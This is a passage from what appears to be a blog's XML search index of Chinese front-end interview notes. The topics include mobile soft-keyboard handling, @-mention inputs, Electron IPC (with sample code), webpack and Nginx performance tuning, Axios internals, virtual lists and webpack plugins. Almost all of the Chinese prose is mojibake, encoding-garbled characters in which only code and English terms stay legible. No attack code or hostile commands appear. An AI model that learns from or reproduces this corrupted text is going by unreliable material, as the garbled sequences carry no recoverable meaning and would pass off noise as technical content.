ä¸Šï¼Œç›‘å¬é¡µé¢ï¼ˆwebviewï¼‰çš„é«˜åº¦å˜åŒ–ï¼Œé«˜åº¦å˜å°èŽ·çŸ¥è½¯é”®ç›˜å¼¹èµ·ï¼Œå¦åˆ™è½¯é”®ç›˜æ”¶èµ·äº†ã€‚ å› ä¸ºæˆ‘ä»¬å·²ç»èƒ½å¤Ÿç›‘å¬åˆ° IOS å’Œ Android è½¯é”®ç›˜å¼¹èµ·å’Œæ”¶èµ·äº†çš„çŠ¶æ€ï¼Œå½“é”®ç›˜å¼¹èµ·æ—¶ï¼Œé’ˆå¯¹è¾“å…¥æ¡†è¢«é®æŒ¡çš„é—®é¢˜ï¼Œæˆ‘çŒœæµ‹æ˜¯ç”±äºŽç¬¬ä¸‰æ–¹è¾“å…¥æ³•è½¯é”®ç›˜è®¡ç®—æœ‰è¯¯é€ æˆï¼Œå¯ä»¥é€šè¿‡ DOM å…ƒç´ çš„ scrollIntoView æ–¹æ³•å°†è¾“å…¥æ¡†æ»šåŠ¨åˆ°å¯è§†åŒºã€‚å½“é”®ç›˜æ”¶èµ·æ—¶ï¼Œé’ˆå¯¹è¾“å…¥æ¡†æ”¶èµ·åŽï¼Œè§†å›¾ä¸‹ä¸æ¥é—®é¢˜ï¼Œå°† document/body é€šè¿‡ scrollTo æ–¹æ³•é‡ç½®è§†å›¾ä½ç½®ã€‚ èŠå¤©è¾“å…¥æ¡†çš„ @ åŠŸèƒ½æ˜¯æ€Žæ ·å®žçŽ°çš„ é¦–å…ˆï¼Œç›‘å¬å¯Œæ–‡æœ¬è¾“å…¥æ¡†çš„ input äº‹ä»¶ï¼Œæœ‰è¾“å…¥ @ å­—ç¬¦ï¼Œå°±ä¼šè§¦å‘æ˜¾ç¤ºåˆ—è¡¨æç¤ºæ¡†ï¼› å…¶æ¬¡ï¼Œå®šä½åˆ—è¡¨æç¤ºæ¡†æ˜¾ç¤ºçš„ä½ç½®ï¼Œåˆ©ç”¨ document.getSelection().getRangeAt(0) èŽ·å–å…‰æ ‡ï¼Œå†é€šè¿‡ range.getBoundingRect() èŽ·å–å…‰æ ‡åœ¨è§†å£çš„ä½ç½®ï¼Œå¯¹åˆ—è¡¨æç¤ºæ¡†è¿›è¡Œå®šä½ï¼› æš‚å­˜å…‰æ ‡ï¼Œå½“é€‰ä¸­åˆ—è¡¨é¡¹æ—¶ï¼Œè¾“å…¥æ¡†ä¼šå¤±åŽ»ç„¦ç‚¹ï¼Œé€‰ä¸­èŽ·å–æ•°æ®åŽï¼Œå†æ¢å¤å…‰æ ‡ï¼Œåœ¨å…‰æ ‡åŽé€šè¿‡ range.inertNode æ’å…¥æ•°æ®ï¼Œå¹¶å°†å…‰æ ‡ range.setEndAfter ç§»åŠ¨åˆ°æœ€åŽï¼› å‚è€ƒæ‰‹æŠŠæ‰‹å®žçŽ°è¾“å…¥æ¡†@åŠŸèƒ½ï¼ˆå®Œç»“ï¼‰SelectionWeb ä¸­çš„â€œé€‰åŒºâ€å’Œâ€œå…‰æ ‡â€éœ€æ±‚å®žçŽ°åŸºäºŽ contenteditable æŠ€æœ¯å®žçŽ°@é€‰äººåŠŸèƒ½åœ¨è¾“å…¥æ¡†å®žçŽ°@ At åŠŸèƒ½çš„ä¸€äº›æ€è€ƒ è§†å±â€œç§’å‘â€å®žçŽ°æ€è·¯å¯Œåª’ä½“åœ¨å®¢æœ IM æ¶ˆæ¯é€šä¿¡ä¸­çš„ç§’å‘å®žè·µ\&lt;video>: è§†é¢‘åµŒå…¥å…ƒç´ JavaScript èŽ·å–è§†é¢‘çš„å°ºå¯¸ä¿¡æ¯å’Œç¬¬ä¸€å¸§å›¾ç‰‡ 1&lt;video preload="metadata" poster=""&gt;&lt;/video&gt; é¡ºä¸°åœ¨çº¿å®¢æœå®¢æœç«¯é¡¹ç›® é¡ºä¸°åœ¨çº¿å®¢æœå®¢æœç«¯æ˜¯ç”¨äºŽé›†å›¢å®¢æœä¸Žè®¿å®¢åœ¨çº¿æ²Ÿé€šçš„ IM æ¡Œé¢è½¯ä»¶ï¼Œé›†æˆäº†å¿«é€’ç›¸å…³ä¸šåŠ¡ã€‚ å‰ç«¯é¡¹ç›®ä½¿ç”¨ electronã€es6ã€vueã€electron-builderã€auto-updater ç­‰ç›¸å…³æŠ€æœ¯æ ˆæž„å»ºã€‚ å®žçŽ° 1 VS n çš„ IM æ ¸å¿ƒæµç¨‹ï¼Œä»¥åŠæ¶ˆæ¯ç¡®è®¤æœºåˆ¶ã€‚ å®žçŽ°æœ¬åœ°æ—¥å¿—é‡‡é›†ï¼Œä»¥åŠæ¶ˆè´¹æ—¥å¿—å­˜å‚¨ indexDBï¼Œåˆ†ç‰‡ä¸Šä¼ ã€‚ electron é€šä¿¡æ–¹å¼electron çš„è¿›ç¨‹åˆ†ä¸ºä¸»è¿›ç¨‹å’Œæ¸²æŸ“è¿›ç¨‹ï¼Œä¸»è¿›ç¨‹å’Œæ¸²æŸ“è¿›ç¨‹é€šè¿‡ IPC é€šä¿¡ã€‚https://www.w3cschool.cn/electronmanual/electronmanual-ipc-main.html ä¸»è¿›ç¨‹ ipcMain.on ç›‘å¬äº‹ä»¶ channelï¼Œå¼‚æ­¥æ¶ˆæ¯ä½¿ç”¨ event.reply(â€¦)ï¼ŒåŒæ­¥æ¶ˆæ¯é€šè¿‡ event.returnValue å‘é€å›žå‘é€è€…ã€‚æ¸²æŸ“è¿›ç¨‹ ipcRender.on ç›‘å¬äº‹ä»¶ channelï¼ŒipcRender.send/ipcRender.sendSync å‘é€å¼‚æ­¥/åŒæ­¥æ¶ˆæ¯ã€‚ 1234567891011121314151617181920// åœ¨ä¸»è¿›ç¨‹ä¸­.const &#123; ipcMain &#125; = require('electron')ipcMain.on('asynchronous-message', (event, arg) =&gt; &#123; console.log(arg) // prints "ping" event.reply('asynchronous-reply', 'pong')&#125;)ipcMain.on('synchronous-message', (event, arg) =&gt; &#123; console.log(arg) // prints "ping" event.returnValue = 'pong'&#125;)//åœ¨æ¸²æŸ“å™¨è¿›ç¨‹ (ç½‘é¡µ) ä¸­ã€‚const &#123; ipcRenderer &#125; = require('electron')console.log(ipcRenderer.sendSync('synchronous-message', 'ping')) // prints "pong"ipcRenderer.on('asynchronous-reply', (event, arg) =&gt; &#123; console.log(arg) // prints "pong"&#125;)ipcRenderer.send('asynchronous-message', 'ping') ä¸»è¿›ç¨‹ ipcMain.handle ç›‘å¬äº‹ä»¶ channelï¼Œè¿”å›žç»“æžœæ˜¯ Promiseï¼Œæ¸²æŸ“è¿›ç¨‹ ipcRender.invoke è§¦å‘äº‹ä»¶ï¼Œå¯ä»¥å¾—åˆ°è§¦å‘äº‹ä»¶ç»“æžœã€‚ 12345678910// Renderer processipcRenderer.invoke('some-name', someArgument).then((result) =&gt; &#123; // ...&#125;)// Main processipcMain.handle('some-name', async (event, someArgument) =&gt; &#123; const result = await doSomeWork(someArgument) return result&#125;) electron-log æ˜¯æ€Žä¹ˆåšçš„ï¼Ÿç½‘ç»œæ€§èƒ½æ£€æµ‹ API PerformanceObserver(callback) æž„é€ å‡½æ•°ï¼Œè§‚å¯Ÿçš„æ€§èƒ½äº‹ä»¶è¢«è®°å½•æ—¶è°ƒç”¨å›žè°ƒ callback å‡½æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯æ€§èƒ½è§‚å¯Ÿæ¡ç›®åˆ—è¡¨ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯è§‚å¯Ÿè€…å¯¹è±¡ã€‚å®žä¾‹ observer.observe è§‚å¯Ÿæ€§èƒ½äº‹ä»¶ç±»åž‹ã€‚ åŸºäºŽ Electron åšçš„ä¼˜åŒ– åŸºäºŽ Web ä¼˜åŒ–ï¼Œä»£ç åˆ†å‰²ã€æŒ‰éœ€åŠ è½½ï¼Œå»¶åŽåŠ è½½ Node æ¨¡å—ï¼ˆæ¨¡å—æŸ¥æ‰¾ã€è¯»å–ï¼‰ï¼Œelectron é¢„è£…äº†å¯¹åº”æœ€æ–°çš„ chromiumï¼Œä½¿ç”¨çŽ°ä»£çš„ JS å’Œ CSSï¼Œbabel é…ç½®æ”¾å®½ï¼Œæ— é¡» postcssï¼Œæ‰“åŒ…ä¼˜åŒ–ï¼Œä»£ç åŽ‹ç¼©ï¼Œtree-shakingï¼› ä¼˜åŒ–è¿›ç¨‹é€šä¿¡ä¼˜åŒ–ï¼š1ã€é¿å…ä½¿ç”¨ remoteï¼Œremote åº•å±‚æ˜¯åŒæ­¥æ“ä½œï¼Œè™½ç„¶åœ¨æ¸²æŸ“è¿›ç¨‹ä¸­é€šè¿‡ remote å¯ä»¥ç›´æŽ¥ä½¿ç”¨ä¸»è¿›ç¨‹ï¼›2ã€å°è£… IPC åº“ï¼Œæ¶ˆæ¯åˆå¹¶ï¼Œæ‰¹é‡ä¼ é€’ï¼Œåºåˆ—åŒ–ï¼Œä¼ é€’ JSON å­—ç¬¦ä¸²ï¼Œé¿å… Electron å¹²æ¶‰åºåˆ—åŒ–ï¼› å‡å°‘ä¸»è¿›ç¨‹è´Ÿè·ï¼šå¯†é›†è®¡ç®—å’Œ IO æ“ä½œé¿å…æ”¾åˆ°ä¸»è¿›ç¨‹ï¼Œæ¯”å¦‚å°†ä¸»çª—å£å’Œæ¶ˆæ¯çª—å£ç›´æŽ¥é€šä¿¡ï¼Œæ—¥å¿—æ”¶é›†æ”¾åœ¨æ¶ˆæ¯çª—å£å®Œæˆï¼› é¡¹ç›®ä¼˜åŒ–å¯¹åœ¨çº¿å®¢æœè®¿å®¢ç«¯åšè¿‡çš„ä¼˜åŒ–å®žè·µï¼š åœ¨ 1-2 å¹´çš„ä¸šåŠ¡è¿­ä»£å¼€å‘ï¼Œå‘çŽ°æœ¬åœ°æž„å»ºå˜æ…¢ï¼Œç”Ÿäº§è®¿é—®ä¹Ÿæ…¢ï¼Œç”¨ Lighthouse å¯¹ç«™ç‚¹è¿›è¡Œæ£€æµ‹ï¼Œperformance æŒ‡æ ‡åªæœ‰ 55 åˆ†ï¼Œç»™å‡ºçš„æ”¹è¿›å»ºè®®å‰å‡ æ¡æ˜¯ï¼š1ã€ä»£ç è¦†ç›–çŽ‡ 50%å·¦å³ï¼Œ2ã€å›¾ç‰‡åŠ è½½æ‹¥å µï¼Œ3ã€å»ºè®®ä½¿ç”¨ HTTP2 ç­‰ã€‚ æŽªæ–½ï¼š webpack æž„å»ºæ‰“åŒ…æ–¹é¢ï¼š1ã€js åŽ‹ç¼©æ··æ·†ç”± uglifyJS æ›¿æ¢æˆå¤šçº¿ç¨‹åŽ‹ç¼©ï¼ŒåŽ‹ç¼©çŽ‡æ›´å¥½çš„ terserï¼›2ã€ä½¿ç”¨ cache-loader åšäºŒæ¬¡æž„å»ºç¼“å­˜ï¼›3ã€åœ¨ optization ä¼˜åŒ–é€‰é¡¹åˆ†åˆ«å¯¹ node_modules å’Œä»£ç ç›®å½•åš splitChunkï¼Œä»£ç è¾“å‡ºå—æŽ§åˆ¶åœ¨ 200k å·¦å³ï¼›4ã€ç”Ÿäº§æž„å»ºä½¿ç”¨ compression-plugin æ‰“ gzip åŽ‹ç¼©å‰¯æœ¬ï¼›5ã€ç”Ÿäº§æž„å»º publicPath é…ç½® CDN åŸŸåï¼›6ã€image-compress-plugin åšå›¾ç‰‡åŽ‹ç¼©ï¼›component-webpack-plugin å¯¹ UI æ¡†æž¶ç»„å»ºæŒ‰éœ€å¼•å…¥ï¼› HTTP è¯·æ±‚æ–¹é¢ï¼š1ã€å‡çº§ Nginx-openresty çš„ ssl æ¨¡å—ï¼Œè¦æ±‚é«˜äºŽ 1.0.2ï¼Œç„¶åŽé…ç½® listen 443 ç«¯å£åŠ ä¸Š ssl http2 å³å¯ï¼›2ã€å¼€å¯ Nginx çš„ gzip å¼€å…³ï¼Œgzip_type è®¾å®šåŒ¹é… HTMLã€CSS å’Œ JavaScript æ–‡ä»¶ï¼Œå†è°ƒæ•´ gzip_buffers çš„åˆ†ç‰‡æ•°é‡å’Œå¤§å°ï¼›3ã€è°ƒæ•´ Nginx å¯¹ JavaScriptã€CSS å’Œå›¾ç‰‡çš„å¼ºç¼“å­˜å’Œåå•†ç¼“å­˜æ—¶é—´ï¼›4ã€å¼€å¯ CDN åŠ é€Ÿï¼› ä»£ç æ–¹é¢ï¼š1ã€å°†æ‰€æœ‰å¼¹çª—å’Œå¡ç‰‡ç»„å»ºæ”¹æˆå¼‚æ­¥ç»„ä»¶ï¼›2ã€å›¾æ ‡é›†æˆ icon-fontï¼› æ­£åœ¨è§£å†³çš„é—®é¢˜ï¼šå°†æ‰€æœ‰å›¾ç‰‡æ›¿æ¢æˆ webp æ ¼å¼ï¼Œé«˜ä¿çœŸï¼Œä½“ç§¯å°ï¼Œä½†æ˜¯æˆ‘ä»¬çš„ h5 æœ‰éƒ¨åˆ†æ¸ é“æ˜¯åµŒå…¥åˆ°å°ç¨‹åºé‡Œï¼Œå°ç¨‹åºä¸æ”¯æŒè¯¥æ ¼å¼ï¼ŒNodejs åšä¸­é—´è½¬æ¢å±‚ï¼› æˆæžœï¼š é€šè¿‡ç¥žç­–åŸ‹ç‚¹æ•°æ®ç»Ÿè®¡ï¼Œé¦–å±æ‰“å¼€ P90 ä»Ž 6s åˆ°ç§’å¼€ï¼›Lighthouse ç«™ç‚¹ Performance æ€§èƒ½æŒ‡æ ‡ä»Ž 55-80ï¼› introductionxxxï¼Œcong shi qian duan kai fa gong zuo kuai 7 nian leï¼Œdang qian jiu zhi yu shunfeng ke ji de ke hu ti yan yan fa buï¼Œå¼€å‘å®¢æœå’Œå®¢æˆ·ä½“éªŒç›¸å…³äº§å“ã€‚ä»Ž 0-1 å®žçŽ°äº†é¡ºä¸°åœ¨çº¿å®¢æœè®¿å®¢å‰ç«¯ï¼ŒåŒ…æ‹¬ PC å’Œ H5 ç«¯ï¼ŒçŽ°å·²ç»æŽ¥å…¥äº† 100 å¤šä¸ªæ¸ é“ï¼Œæ¯”å¦‚é¡ºä¸°å®˜ç½‘ã€å°ç¨‹åºã€å†·è¿ï¼Œè¿˜æœ‰ç¬¬ä¸‰æ–¹ appï¼Œèœ‚å·¢ã€èšç¾Žä¼˜å“ã€æ‹¼å¤šå¤šå’ŒæŠ–éŸ³ç­‰ã€‚ å®žçŽ°æ ¸å¿ƒ IM æµç¨‹ï¼Œé˜²æ­¢æ¶ˆæ¯ä¸¢å¤±ï¼Œé‡‡ç”¨å‘å¸ƒ-è®¢é˜…è€…æ¨¡å¼ï¼Œå»ºç«‹äº†ä¸€å¥—ç±»ä¼¼ TCP æ¶ˆæ¯ä¸¢å¤±ï¼Œé‡å‘ ack ç¡®è®¤æœºåˆ¶ï¼Œç¡®ä¿å¤æ‚çš„ç§»åŠ¨ç«¯çŽ¯å¢ƒæ¶ˆæ¯ 0 ä¸¢å¤±ï¼› ç”±äºŽé¡¹ç›®éœ€è¦æŽ¥å…¥å¤šç«¯çŽ¯å¢ƒï¼Œéœ€è¦åšä¸€äº›å…¼å®¹ï¼Œæ¯”å¦‚ï¼šèŠå¤©è¾“å…¥æ¡†å¸é™„è½¯é”®ç›˜å…¼å®¹ï¼Œwebsocket å›žé€€è½®è¯¢å…¼å®¹ï¼Œh5 ä¸Ž app è¿˜æœ‰ä¸Žå°ç¨‹åºé€šè®¯å…¼å®¹ç­‰ï¼› è§£å†³ C ç«¯å›¾ç‰‡æµé‡åé«˜é—®é¢˜ï¼Œå°è¯•ä½¿ç”¨ JS å¯¹å›¾ç‰‡åŽ‹ç¼©åŽä¸Šä¼ ï¼Œå°è£…æˆäº†ä¸€ä¸ª npm æ’ä»¶ï¼› åœ¨è¿‘ä¸€å¹´çš„ç´§å¼ åœ°å¼€å‘ä¸­ï¼ŒåŸºäºŽ Electron ä»Ž 0-1 å¼€å‘äº†å®¢æœ IM æ¡Œé¢å®¢æˆ·ç«¯ï¼Œå®žçŽ°äº† 1 å¯¹ N çš„ IM æ ¸å¿ƒèƒ½åŠ›ï¼ŒåŒæ—¶é›†æˆäº†è¿å•æŸ¥è¯¢ã€ç”¨æˆ·è½¨è¿¹å’Œæœºå™¨äººè‡ªåŠ¨è¾…åŠ©èƒ½åŠ›ã€‚ ç®€åŒ–äº†ä¸»è¿›ç¨‹å’Œæ¸²æŸ“è¿›ç¨‹ ipc é€šè®¯ï¼Œæ¸…æ´—æ•°æ®ä¿å­˜å¿«ç…§ï¼Œä¼˜åŒ–æœ¬åœ°æ•°æ®åº“ indexDB å­˜å–é¢‘æ¬¡å’Œå¤§å°ï¼ŒæŽ§åˆ¶ keep-alive ç»„ä»¶äºŒçº§ç¼“å­˜æ•°é‡ç­‰æŽªæ–½ï¼Œè§£å†³ç™½å±å’Œé—ªé€€é—®é¢˜ï¼› ä»¥ä¸Šæ˜¯æˆ‘çš„åŸºæœ¬æƒ…å†µã€‚ å®¢æˆ·ç«¯ä¸‰å±‚æž¶æž„è®¾è®¡åŸºç¡€æ¡†æž¶ç‰©æ–™æž„å»ºã€‚Electron æ¡Œé¢è·¨ç«¯èƒ½åŠ›ï¼Œwebpack çŽ°ä»£æ‰“åŒ…å·¥å…·æž„å»ºé¡µé¢åº”ç”¨ï¼Œnodejs å’Œ chromium æœ¬åœ°åŒ–èƒ½åŠ›ã€‚åº”ç”¨èƒ½åŠ›å¥å£®å’Œå¢žå¼ºã€‚æ¸²æŸ“è¿›ç¨‹å’Œä¸»è¿›ç¨‹å±‚æ—¥å¿—æ”¶é›†ä¸Žä¸ŠæŠ¥ï¼Œè‡ªåŠ¨æˆ–å¼ºåˆ¶æ›´æ–°ï¼Œæœ¬åœ°å¼‚æ­¥æ¶ˆæ¯é˜Ÿåˆ—å­˜å‚¨ï¼ŒIPC é€šè®¯æ¶ˆæ¯åˆå¹¶å’Œåºåˆ—åŒ–ï¼Œweb worker çº¿ç¨‹åšé«˜å¼€é”€è¿ç®—ã€‚åº”ç”¨æ‹“å±•èƒ½åŠ›å’Œå¹³å°åŒ–ã€‚è·¯ç”±æƒé™åˆ†å‰²ï¼Œç¬¬ä¸‰æ–¹åº”ç”¨ä»¥å¾®åº”ç”¨å½¢å¼æŽ¥å…¥ï¼Œè§£å†³åœ¨çº¿å’Œç¦»çº¿åº”ç”¨è·¨åŸŸè¯·æ±‚ï¼Œsdk æä¾›äº¤äº’å’Œåº•å±‚èƒ½åŠ›ã€‚]]></content>
      <tags>
        <tag>interview</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[inter-principle]]></title>
    <url>%2F2021%2F09%2F05%2Finter-principle%2F</url>
    <content type="text"><![CDATA[Axios åŽŸç† å¤§è‡´æ­¥éª¤ï¼šAxios å®žä¾‹åŒ– -&gt; æ‰§è¡Œè¯·æ±‚æ‹¦æˆªå™¨ï¼ˆrequestï¼š new InterceptorManager()ï¼‰ -&gt; æ´¾å‘è¯·æ±‚ï¼ˆdispatchRequestï¼‰ -&gt; è½¬æ¢è¯·æ±‚æ•°æ®ï¼ˆtransformRequestï¼‰ -&gt; é€‚é…å™¨ï¼ˆadapterï¼‰å¤„ç†è¯·æ±‚ -&gt; è½¬æ¢å“åº”æ•°æ®ï¼ˆtransformResponseï¼‰ -&gt; æ‰§è¡Œå“åº”æ‹¦æˆªå™¨ï¼ˆresponse: new InterceptorManager()ï¼‰ -&gt; axiosï¼› axios å®žé™…è¿”å›žçš„æ˜¯ Axios.prototype.request æ–¹æ³•ï¼Œå¹¶ä¸”å°† axios å®žä¾‹æ‰€æœ‰æ–¹æ³•å¼•ç”¨èµ‹å€¼åˆ° request æ–¹æ³•å±žæ€§ä¸Šï¼Œthis ç»‘å®š axios å®žä¾‹ï¼› request.use å’Œ response.use åˆ†åˆ«æ”¶é›†ç”¨æˆ·è¯·æ±‚ä»»åŠ¡é˜Ÿåˆ—å’Œå“åº”æ‹¦æˆªä»»åŠ¡é˜Ÿåˆ—ï¼Œä¸Žæ´¾å‘è¯·æ±‚åˆæˆ chain ä»»åŠ¡é˜Ÿåˆ—ï¼Œåˆ©ç”¨ promise.then(chain.shift(), chain.shift()) é“¾å¼æ‰§è¡Œä»»åŠ¡é˜Ÿåˆ—ï¼› å‚è€ƒï¼šHTTP è¯·æ±‚åº“ - Axios æºç åˆ†æž Virtual list åŽŸç†å®žçŽ°å‰æï¼Œåˆ—è¡¨å®¹å™¨å®šé«˜ï¼Œå®¹å™¨å†…æœ‰ä¸€ä¸ªå½±å­å®¹å™¨ï¼Œé«˜åº¦ä¸ºç®—å‡ºçš„å®žé™…å†…å®¹é«˜åº¦ï¼Œè¿™æ ·å°±æœ‰çœŸå®žçš„æ»šåŠ¨æ¡åŠæ»šåŠ¨æ•ˆæžœã€‚è€ŒçœŸå®žå±•ç¤ºç»™ç”¨æˆ·è§†çª—ä¸­çš„æ˜¯ç»å¯¹å®šä½çš„å…ƒç´ æž„æˆçš„çœŸå®žå®¹å™¨ï¼Œå½±å­å®¹å™¨æ»šåŠ¨ï¼ŒçœŸå®žå®¹å™¨ä¹Ÿè·Ÿç€æ»šåŠ¨ï¼Œç›‘å¬å½±å­å®¹å™¨çš„ onscroll äº‹ä»¶ï¼ŒèŽ·å–å½±å­å®¹å™¨çš„ scrollTopï¼Œç®—å‡ºè§†çª—ä¸­ç¬¬ä¸€é¡¹æ¸²æŸ“çš„æ•°æ®ç´¢å¼• startIndex æœ‰æ²¡æœ‰æ›´æ–°ï¼Œæœ‰ï¼Œåˆ™é‡æ–°æˆªå–åˆ—è¡¨æ•°æ®æ¸²æŸ“å¯è§†åŒºã€‚è™½ç„¶è¯´æ˜¯é‡æ–°æ¸²æŸ“ï¼Œä½†æ˜¯ä¸‹ä¸€å¸§å’Œå½“å‰æ»šåŠ¨ä½ç½®å…ƒç´ ä¸€æ ·ï¼Œæ‰€ä»¥ç”¨æˆ·æ— æ„ŸçŸ¥ã€‚ ç¡®å®šå½±å­å®¹å™¨çš„é«˜åº¦ï¼š åˆ—è¡¨å†…å®¹æ¯ä¸€é¡¹å®šé«˜ï¼Œå½±å­å®¹å™¨çš„é«˜åº¦=æ¯ä¸€é¡¹å®šé«˜ x total åˆ—è¡¨å†…å®¹æ¯ä¸€é¡¹ä¸å®šé«˜ï¼Œå¯ä»¥åˆå§‹å‡è®¾æ¯ä¸€é¡¹å®šé«˜ï¼Œç®—å‡ºå½±å­å®¹å™¨é«˜åº¦ï¼Œè¿™æ ·å®¹å™¨å¯æ»šåŠ¨ï¼Œå¾…çœŸå®žå®¹å™¨æ¸²æŸ“åŽï¼Œç®—å‡ºæ¯ä¸€é¡¹å…ƒç´ çš„é«˜åº¦ã€ä½ç½®ä¿¡æ¯ï¼Œå†åŽ»æ›´æ–°å½±å­å®¹å™¨é«˜åº¦ã€‚ç®—å‡ºäº†å½±å­å®¹å™¨çš„é«˜åº¦åŠå…¶æ¯ä¸€é¡¹çš„ä½ç½®ä¿¡æ¯ï¼Œåˆå·²çŸ¥ scrollTopï¼Œå¯ä»¥é€šè¿‡äºŒåˆ†æ³•æ‰¾åˆ°å½“å‰çš„ startIndexã€‚ å‚è€ƒï¼š å‰ç«¯è™šæ‹Ÿåˆ—è¡¨å®žçŽ°åŽŸç† webpack æž„å»ºåŽŸç†webpack æ˜¯ä¸€ä¸ªçŽ°ä»£ JavaScript åº”ç”¨ç¨‹åºçš„é™æ€æ¨¡å—æ‰“åŒ…å™¨ã€‚å½“ webpack å¤„ç†åº”ç”¨ç¨‹åºæ—¶ï¼Œå®ƒä¼šé€’å½’åœ°æž„å»ºä¸€ä¸ªä¾èµ–å…³ç³»å›¾ï¼ŒåŒ…å«åº”ç”¨ç¨‹åºéœ€è¦çš„æ¯ä¸ªæ¨¡å—ï¼Œç„¶åŽå°†æ‰€æœ‰è¿™äº›æ¨¡å—æ‰“åŒ…æˆä¸€ä¸ªæˆ–å¤šä¸ª bundleã€‚webpack åƒä¸€æ¡ç”Ÿäº§çº¿ï¼Œå…¶ä¸­æ¯ä¸ªå¤„ç†æµç¨‹çš„èŒè´£æ˜¯å•ä¸€çš„ï¼Œåªæœ‰å½“å‰æµç¨‹å¤„ç†å®ŒæˆåŽæ‰èƒ½äº¤ç»™ä¸‹ä¸€ä¸ªæµç¨‹å¤„ç†ã€‚webpack é€šè¿‡ Tapable ç»„ç»‡è¿™æ¡å¤æ‚çš„ç”Ÿäº§çº¿ã€‚webpack åœ¨è¿è¡Œè¿‡ç¨‹ä¸­ä¼šå¹¿æ’­äº‹ä»¶ï¼Œæ’ä»¶åªéœ€è¦ç›‘å¬å®ƒæ‰€å…³å¿ƒçš„äº‹ä»¶ï¼Œå°±èƒ½åŠ å…¥åˆ°è¿™æ¡ç”Ÿäº§çº¿ï¼Œæ”¹å˜ç”Ÿäº§çº¿çš„è¿ä½œã€‚webpack çš„äº‹ä»¶æµæœºåˆ¶ä¿è¯äº†æ’ä»¶çš„æœ‰åºæ€§ã€‚ webpack loader å’Œ plugin çš„åŒºåˆ« loader è®© webpack èƒ½å¤ŸåŽ»å¤„ç†é‚£äº›éž JavaScript æ–‡ä»¶ï¼ˆwebpack è‡ªèº«åªç†è§£ JavaScriptï¼‰ã€‚loader å¯ä»¥å°†æ‰€æœ‰ç±»åž‹çš„æ–‡ä»¶è½¬æ¢ä¸º webpack èƒ½å¤Ÿå¤„ç†çš„æœ‰æ•ˆæ¨¡å—ï¼Œç„¶åŽä½ å°±å¯ä»¥åˆ©ç”¨ webpack çš„æ‰“åŒ…èƒ½åŠ›ï¼Œå¯¹å®ƒä»¬è¿›è¡Œå¤„ç†ã€‚ loader è¢«ç”¨äºŽè½¬æ¢æŸäº›ç±»åž‹çš„æ¨¡å—ï¼Œè€Œæ’ä»¶åˆ™å¯ä»¥ç”¨äºŽæ‰§è¡ŒèŒƒå›´æ›´å¹¿çš„ä»»åŠ¡ã€‚æ’ä»¶çš„èŒƒå›´åŒ…æ‹¬ï¼Œä»Žæ‰“åŒ…ä¼˜åŒ–å’ŒåŽ‹ç¼©ï¼Œä¸€ç›´åˆ°é‡æ–°å®šä¹‰çŽ¯å¢ƒä¸­çš„å˜é‡ã€‚æ’ä»¶æŽ¥å£åŠŸèƒ½æžå…¶å¼ºå¤§ï¼Œå¯ä»¥ç”¨æ¥å¤„ç†å„ç§å„æ ·çš„ä»»åŠ¡ã€‚ webpack plugin å®žçŽ° Plugin æ˜¯ä¸€ä¸ªç±»ï¼ˆClassï¼‰ï¼Œç±»æœ‰ä¸€ä¸ª apply æ–¹æ³•ï¼Œæ‰§è¡Œå…·ä½“çš„æ’ä»¶æ–¹æ³•ï¼› è°ƒç”¨ apply æ–¹æ³•å…¥å‚æ³¨å…¥ä¸€ä¸ª compiler å®žä¾‹ï¼Œcompiler å®žä¾‹æ˜¯ webpack çš„æ”¯æŸ±å¼•æ“Žï¼Œä»£è¡¨ CLI å’Œ Node API ä¼ é€’çš„æ‰€æœ‰é…ç½®é¡¹ï¼› compiler ä¸Šçš„ Hook å›žè°ƒæ–¹æ³•æ³¨å…¥ compilation å®žä¾‹ï¼Œcompilation èƒ½å¤Ÿè®¿é—®å½“å‰æž„å»ºæ—¶çš„æ¨¡å—å’Œç›¸åº”çš„ä¾èµ–ï¼› compiler å¯¹è±¡åŒ…å«äº† Webpack çŽ¯å¢ƒæ‰€æœ‰çš„é…ç½®ä¿¡æ¯ï¼ŒåŒ…å« optionsï¼Œloadersï¼Œplugins è¿™äº›ä¿¡æ¯ï¼Œè¿™ä¸ªå¯¹è±¡åœ¨ Webpack å¯åŠ¨æ—¶å€™è¢«å®žä¾‹åŒ–ï¼Œå®ƒæ˜¯å…¨å±€å”¯ä¸€çš„ï¼Œå¯ä»¥ç®€å•åœ°ç†è§£ä¸º Webpack å®žä¾‹ï¼›compilation å¯¹è±¡åŒ…å«äº†å½“å‰çš„æ¨¡å—èµ„æºã€ç¼–è¯‘ç”Ÿæˆèµ„æºã€å˜åŒ–çš„æ–‡ä»¶ç­‰ã€‚æ¯”å¦‚å¯ä»¥èŽ·å–ä»£ç å— compilation.chunksï¼Œè¯»å–æ¨¡å— chunk.forEachModuleï¼Œæ–‡ä»¶ chunk.filesã€‚å½“ Webpack ä»¥å¼€å‘æ¨¡å¼è¿è¡Œæ—¶ï¼Œæ¯å½“æ£€æµ‹åˆ°ä¸€ä¸ªæ–‡ä»¶å˜åŒ–ï¼Œä¸€æ¬¡æ–°çš„ Compilation å°†è¢«åˆ›å»ºã€‚Compilation å¯¹è±¡ä¹Ÿæä¾›äº†å¾ˆå¤šäº‹ä»¶å›žè°ƒä¾›æ’ä»¶åšæ‹“å±•ï¼Œé€šè¿‡ Compilation ä¹Ÿèƒ½è¯»å–åˆ° Compiler å¯¹è±¡ã€‚Compiler å’Œ Compilation çš„åŒºåˆ«åœ¨äºŽï¼šCompiler ä»£è¡¨äº†æ•´ä¸ª Webpack ä»Žå¯åŠ¨åˆ°å…³é—­çš„ä»€ä¹ˆå‘¨æœŸï¼Œè€Œ Compilation åªä»£è¡¨ä¸€æ¬¡æ–°çš„ç¼–è¯‘ã€‚Hook æš´éœ²äº† 3 ä¸ªæ–¹æ³•ï¼štapã€tapAsync å’Œ tapPromiseï¼Œå®šä¹‰å¦‚ä½•æ‰§è¡Œ Hookï¼Œåˆ†åˆ«è¡¨ç¤ºæ³¨å†ŒåŒæ­¥ã€å¼‚æ­¥ã€Promise å½¢å¼ Hookã€‚ 12345678const pluginName = 'MyPlugin'class MyPlugin &#123; apply(compiler) &#123; compiler.hooks.run.tap(pluginName, (compilation) =&gt; &#123; // ... &#125;) &#125;&#125; Compiler Hooks Hook Type è°ƒç”¨ run AsyncSeriesHook å¼€å§‹è¯»å– records ä¹‹å‰ compile SyncHook 